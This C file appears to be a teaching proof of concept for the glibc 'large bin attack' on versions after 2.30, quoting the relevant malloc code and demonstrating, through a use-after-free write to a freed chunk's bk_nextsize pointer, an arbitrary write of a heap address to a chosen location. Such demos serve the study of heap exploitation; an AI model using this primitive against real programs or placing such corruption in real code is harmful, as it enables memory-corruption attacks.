#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
/*
A revisit to large bin attack for after glibc2.30
Relevant code snippet :
  if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
    fwd = bck;
    bck = bck->bk;
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
  }
*/
int main()
{
  size_t target = 0;
  size_t *p1 = malloc(0x428);
  size_t *g1 = malloc(0x18);
  size_t *p2 = malloc(0x418);
  size_t *g2 = malloc(0x18);
  free(p1);
  size_t *g3 = malloc(0x438);
  free(p2);
  p1[3] = (size_t)((&target) - 4);
  size_t *g4 = malloc(0x438);
  assert((size_t)(p2 - 2) == target);
  return 0;
}
